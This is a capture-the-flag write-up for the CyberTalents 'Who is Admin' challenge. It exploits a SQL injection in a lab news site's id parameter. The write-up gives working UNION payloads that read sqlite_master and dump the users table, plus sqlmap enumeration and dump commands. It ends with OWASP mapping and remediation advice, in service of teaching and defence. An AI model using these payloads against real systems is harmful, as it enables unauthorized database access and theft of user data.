# Who is Admin - CyberTalents

---

## Challenge Description
**Your mission is to know who's the admin running this website by knowing his email.**

## Challenge Link
http://cdcamxwl32pue3e6mk873oykcwzy0m236mnkmugv0-web.cybertalentslabs.com/

---

## 1. Initial Interface

The challenge is accessed via the CyberTalents platform, which displays the challenge title, description, and a link to launch the target web application.

<p align="center">
<img width="687" height="324" alt="image" src="https://github.com/user-attachments/assets/edb5974b-8320-4e37-8f69-7939f312d398" />
</p>

---

## 2. Challenge Page — Perfect News Website

Upon navigating to the challenge URL, a news website titled **"Perfect News Website"** is presented. It displays a section called **"Our Latest News"** with news articles and images. Nothing appears immediately exploitable on the surface.

<p align="center">
<img width="896" height="389" alt="image" src="https://github.com/user-attachments/assets/3e35ccd3-b5b1-47ce-aedd-bb98f9fa7420" />
</p>

---

## 3. Identifying the Vulnerability — URL Parameter

Clicking the **"Read More"** button on any news article changes the URL to:

```
http://cdcamxwl32pue3e6mk873oykcwzy0m236mnkmugv0-web.cybertalentslabs.com/shownews.php?id=2
```

<p align="center">
<img width="179" height="147" alt="image" src="https://github.com/user-attachments/assets/3c36cb2b-2a73-40d6-9763-8280f6f618f9" />
</p>

<p align="center">
<img width="536" height="49" alt="image" src="https://github.com/user-attachments/assets/1cf08834-f931-44bd-8c7f-21207c8d8747" />
</p>

The `?id=2` parameter in the URL is a classic SQL injection indicator — the server is likely using this numeric value directly inside a SQL query to fetch the correct news article from the database.

---

## 4. Source Code Analysis — Confirming the Injection Point

Inspecting the page source confirms each news article has its own `id` parameter in the link:

```html
<a href="shownews.php?id=1">ReadMore</a>
<a href="shownews.php?id=2">ReadMore</a>
<a href="shownews.php?id=3">ReadMore</a>
```

<p align="center">
<img width="937" height="317" alt="image" src="https://github.com/user-attachments/assets/932e0583-dba9-4940-8f70-e966eff9d992" />
</p>

The backend PHP code is almost certainly running a query like:

```sql
SELECT * FROM news WHERE id = [user input];
```

Since the `id` value comes directly from the URL and is inserted into the SQL query without sanitisation, this is a textbook **SQL Injection** vulnerability.

---

## 5. Testing the Injection Point — Error Confirmation

To confirm the vulnerability, the `id` value is changed from a number to the word `admin`:

```
shownews.php?id=admin
```

<p align="center">
<img width="352" height="140" alt="image" src="https://github.com/user-attachments/assets/f6897e0a-9016-4dc1-96fb-d592f25d7321" />
</p>

The server returns a database error:

> **`Error: HY000 1 no such column: admin`**

<p align="center">
<img width="352" height="140" alt="image" src="https://github.com/user-attachments/assets/34bfe7c2-1dfa-4976-8dd7-4ee3b11836e8" />
</p>

### Why Test With `admin`?

The word `admin` was used as a test value — not because we expected it to work, but because it is a **non-numeric string** that would break any SQL query expecting a number. The goal was to observe how the server responds to unexpected input.

The error `no such column: admin` is a critical finding because it tells us:

- The input `admin` was passed **directly into the SQL query** without sanitisation
- The database tried to interpret `admin` as a **column name** — meaning the query structure is `WHERE id = admin` (without quotes)
- The server is leaking raw **database error messages** — confirming the injection point and revealing the database engine is **SQLite** (HY000 is a SQLite error code)

This confirms the application is **vulnerable to SQL injection via the URL parameter**.

---

## 6. Extracting the Database Schema — UNION Injection

Now that the injection point is confirmed, a **UNION-based SQL injection** is used to extract information from the database. The `sqlite_master` table is queried — a special built-in SQLite table that stores the schema of every table in the database.

The payload injected into the URL:

```
shownews.php?id=2+UNION+select+*+from+sqlite_master
```

Full URL:

```
http://cdcamxwl32pue3e6mk873oykcwzy0m236mnkmugv0-web.cybertalentslabs.com/shownews.php?id=2+UNION+select+*+from+sqlite_master
```

<p align="center">
<img width="613" height="257" alt="image" src="https://github.com/user-attachments/assets/f0bcc994-7220-4075-804d-5876e5306ec6" />
</p>

### How Does UNION Injection Work?

The `UNION` operator in SQL combines the results of two `SELECT` queries into one result set. The original query fetches a news article by ID. By appending `UNION select * from sqlite_master`, a second query is added that reads from the schema table:

```sql
-- Original query
SELECT * FROM nxf8_news WHERE id = 2

-- After injection becomes:
SELECT * FROM nxf8_news WHERE id = 2
UNION
SELECT * FROM sqlite_master
```

The combined result set is returned to the page — displaying both the original news article AND the full database schema.

### Why `+` Instead of Spaces?

In URLs, spaces are not allowed directly. The `+` character is the URL-encoded representation of a space — so `+UNION+select+*` is the same as ` UNION select *` in the actual SQL query.

### What is `sqlite_master`?

`sqlite_master` is a special read-only system table built into every SQLite database. It stores the definition of every table, index, and view in the database — similar to `INFORMATION_SCHEMA` in MySQL.

| Column | Contains |
|--------|---------|
| `type` | Object type (table, index, view) |
| `name` | Name of the table or object |
| `tbl_name` | Table the object belongs to |
| `sql` | The full `CREATE TABLE` statement |

The response reveals two table names:

```
nxf8_news
nxf8_users
```

The `nxf8_users` table is the target — it almost certainly contains the admin email.

---

## 7. Extracting All User Data

The URL is changed to query the full `nxf8_users` table:

```
http://cdcamxwl32pue3e6mk873oykcwzy0m236mnkmugv0-web.cybertalentslabs.com/shownews.php?id=2+UNION+select+*+from+nxf8_users
```

<p align="center">
<img width="634" height="362" alt="image" src="https://github.com/user-attachments/assets/b1696257-8b17-44f7-b214-a29b1c567a88" />
</p>

The full user table is returned — showing all registered users including their roles.

---

## 8. Extracting the Admin Email — Flag Obtained

To specifically target the admin's email and role, a more targeted injection is used:

```
shownews.php?id=2+UNION+select+NULL,email,NULL,role,NULL+from+nxf8_users
```

Full URL:

```
http://cdcamxwl32pue3e6mk873oykcwzy0m236mnkmugv0-web.cybertalentslabs.com/shownews.php?id=2+UNION+select+NULL,email,NULL,role,NULL+from+nxf8_users
```

### Why Use `NULL` in the SELECT?

The `UNION` operator requires both queries to return the **same number of columns**. The original news query returns 5 columns — so the injected query must also return exactly 5 values. `NULL` is used as a placeholder for columns we do not need, while `email` and `role` are placed in the positions that the page actually displays.

<p align="center">
<img width="693" height="300" alt="image" src="https://github.com/user-attachments/assets/d3bcdfc0-c053-4bac-9247-9cfe5a3a0b13" />
</p>

The admin's email is revealed:

> **FLAG: `ryan@secret.org`**

---

## 9. Alternative Method — SQLMap

The same result can be achieved automatically using **SQLMap** — an open-source tool that automates SQL injection detection and exploitation.

### What is SQLMap?

**SQLMap** is a command-line penetration testing tool pre-installed on Kali Linux. It automatically detects SQL injection vulnerabilities, identifies the database engine, and extracts data — without needing to craft payloads manually.

### How to Use SQLMap for This Challenge

```bash
# Step 1 — Detect the vulnerability and enumerate databases
sqlmap -u "http://[challenge-url]/shownews.php?id=2" --dbs
```
<p align="center">
<img width="658" height="140" alt="image" src="https://github.com/user-attachments/assets/c490c4cf-3ac3-41f8-9c5f-f1426dde2562" />
</p>

```bash
# Step 2 — Enumerate tables in the database
sqlmap -u "http://[challenge-url]/shownews.php?id=2" --tables
```

<p align="center">
<img width="129" height="78" alt="image" src="https://github.com/user-attachments/assets/6ee9d6c9-8649-4c0a-9695-5de264f960c4" />
</p>

```bash
# Step 3 — Dump the nxf8_users table
sqlmap -u "http://[challenge-url]/shownews.php?id=2" -T nxf8_users --dump
````
<p align="center">
<img width="413" height="277" alt="image" src="https://github.com/user-attachments/assets/041cbbe4-2f65-4751-88f2-f0a52f4e6eff" />
</p>

It enumerate and dump the table. 

<p align="center">
<img width="518" height="321" alt="image" src="https://github.com/user-attachments/assets/24103d92-ec04-48eb-9d1f-c7d619aef65b" />
</p>

SQLMap would automatically discover the same `nxf8_users` table and extract the admin email `ryan@secret.org` without requiring any manual payload crafting.

---

# OWASP Classification

This vulnerability falls under:

> **OWASP Top 10: A03 — Injection (SQL Injection)**

The `id` parameter in the URL was passed directly into a SQL query without sanitisation or parameterisation. This allowed an attacker to append arbitrary SQL using `UNION` to read any table in the database — including the users table containing admin credentials.

---

# Why This Is a Security Issue

The application passed the URL parameter directly into the SQL query without any protection:

| Issue | Impact |
|-------|--------|
| `id` parameter unsanitised | Raw user input reaches the SQL engine |
| Raw database errors returned | Error messages confirm injection and leak database type |
| `sqlite_master` accessible | Full database schema enumerable without authentication |
| No column restriction on `nxf8_users` | All user data including emails and roles fully readable |
| UNION injection possible | Any table in the database can be queried |

### Manual Injection vs SQLMap

| | Manual UNION Injection | SQLMap |
|--|----------------------|--------|
| **Speed** | Slower — requires understanding the schema | Very fast — automated |
| **Learning** | High — teaches exactly how SQL injection works | Lower — tool does the work |
| **Stealth** | More controlled | Generates many requests — noisy |
| **Use case** | CTF learning, understanding the vulnerability | Rapid enumeration in authorised testing |

---

# Exploitation Flow (OWASP A03 Mapping)

1. Attacker visits the news website and clicks "Read More"
2. URL reveals `?id=2` parameter — classic SQL injection indicator
3. Source code confirms `shownews.php?id=` pattern across all articles
4. `id=admin` tested — server returns `Error: HY000 1 no such column: admin`
5. Error confirms raw input reaches SQL — SQLite database identified
6. `UNION select * from sqlite_master` injected — database schema returned
7. Two tables discovered: `nxf8_news` and `nxf8_users`
8. `UNION select * from nxf8_users` injected — full user table returned
9. `UNION select NULL,email,NULL,role,NULL from nxf8_users` — admin email targeted
10. Admin email revealed: **`ryan@secret.org`**

---

# Conclusion

This challenge demonstrates **URL-based SQL Injection** — one of the most common and well-known web vulnerabilities. The `?id=` parameter was passed directly into a SQLite query with no sanitisation, allowing full database enumeration using `UNION`-based injection. The leaked error message from step 5 was actually a valuable clue — it confirmed the injection point and identified the database engine without needing any further testing.

To prevent SQL injection, applications must:

- **Always use parameterised queries** (prepared statements) — never concatenate user input into SQL strings
- **Never expose database error messages** to users — log them server-side only
- Apply the **principle of least privilege** — the database user should only have SELECT access to necessary tables
- Use an **ORM (Object Relational Mapper)** — these handle parameterisation automatically
- **Input validation** — for numeric parameters like `id`, verify the input is actually a number before using it
